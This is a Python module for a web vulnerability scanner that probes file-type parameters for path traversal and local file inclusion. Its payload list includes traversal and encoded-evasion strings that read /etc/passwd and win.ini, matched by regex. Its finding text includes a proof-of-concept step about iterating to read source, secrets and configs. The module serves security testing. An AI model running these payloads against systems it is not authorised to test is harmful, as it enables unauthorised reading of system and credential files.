"""Path Traversal Scanner — directory traversal / LFI with raw HTTP capture."""

import re
from urllib.parse import urlparse

import httpx

import cvss
from scanners.base import BaseScanner, Finding, Confidence


TRAVERSAL_PAYLOADS = [
    {"payload": "../../../../etc/passwd", "pattern": r"root:.*:0:0:", "file": "/etc/passwd"},
    {"payload": "....//....//....//etc/passwd", "pattern": r"root:.*:0:0:", "file": "/etc/passwd"},
    {"payload": "..%2f..%2f..%2f..%2fetc%2fpasswd", "pattern": r"root:.*:0:0:", "file": "/etc/passwd"},
    {"payload": "....\\....\\....\\windows\\win.ini", "pattern": r"\[fonts\]|\[extensions\]", "file": "win.ini"},
    {"payload": "..\\..\\..\\..\\windows\\win.ini", "pattern": r"\[fonts\]|\[extensions\]", "file": "win.ini"},
    {"payload": "/etc/passwd", "pattern": r"root:.*:0:0:", "file": "/etc/passwd"},
]

FILE_PARAMS = [
    "file", "path", "page", "template", "include", "doc", "folder", "dir",
    "pdf", "view", "content", "document", "layout", "mod", "conf",
]


class PathTraversalScanner(BaseScanner):
    name = "pathtraversal"
    description = "Path traversal / LFI detection"

    async def scan(self, target_url: str) -> list[Finding]:
        findings: list[Finding] = []
        try:
            async with httpx.AsyncClient(
                timeout=15.0, follow_redirects=True, verify=False
            ) as client:
                resp, _ = await self.request(client, "GET", target_url)
                if resp is None:
                    return findings
                params = self._get_injectable_params(target_url, resp.text)

                if not params:
                    parsed = urlparse(target_url)
                    for n in FILE_PARAMS:
                        sep = "&" if parsed.query else "?"
                        params.append({"name": n, "url": f"{target_url}{sep}{n}=index"})

                for param_info in params:
                    self.cancel_token.raise_if_cancelled()
                    name = param_info["name"]
                    test_url = param_info["url"]
                    hit = False
                    for probe in TRAVERSAL_PAYLOADS:
                        if hit:
                            break
                        inject_url = self._inject_param(test_url, name, probe["payload"])
                        r, cap = await self.request(client, "GET", inject_url, timeout=10)
                        if r is None:
                            continue
                        if re.search(probe["pattern"], r.text, re.IGNORECASE):
                            findings.append(self._make_finding(
                                title=f"Path traversal in '{name}' reads {probe['file']}",
                                cvss_vector=cvss.vector("path_traversal"),
                                cwe_id="CWE-22",
                                cwe_name="Improper Limitation of a Pathname to a Restricted Directory",
                                description=(
                                    f"'{name}' allows escaping the intended directory and "
                                    f"reading {probe['file']}. The application does not "
                                    f"canonicalize the path or enforce an allowlist."
                                ),
                                evidence=f"Pattern matched: {probe['pattern']}",
                                capture=cap,
                                poc_steps=[
                                    f"Open {inject_url}",
                                    f"Response contains {probe['file']} contents",
                                    "Iterate to read application source, secrets, configs",
                                ],
                                remediation=(
                                    "Resolve the requested path, then verify the resolved "
                                    "absolute path is inside the allowed root. Reject any "
                                    "input containing path-separator metacharacters."
                                ),
                                references=["https://owasp.org/www-community/attacks/Path_Traversal"],
                                target_url=inject_url,
                                parameter=name,
                                confidence=Confidence.EXECUTED,
                            ))
                            hit = True

        except Exception as e:
            findings.append(self._make_finding(
                title="Path-traversal scan error",
                description=str(e),
            ))
        return findings
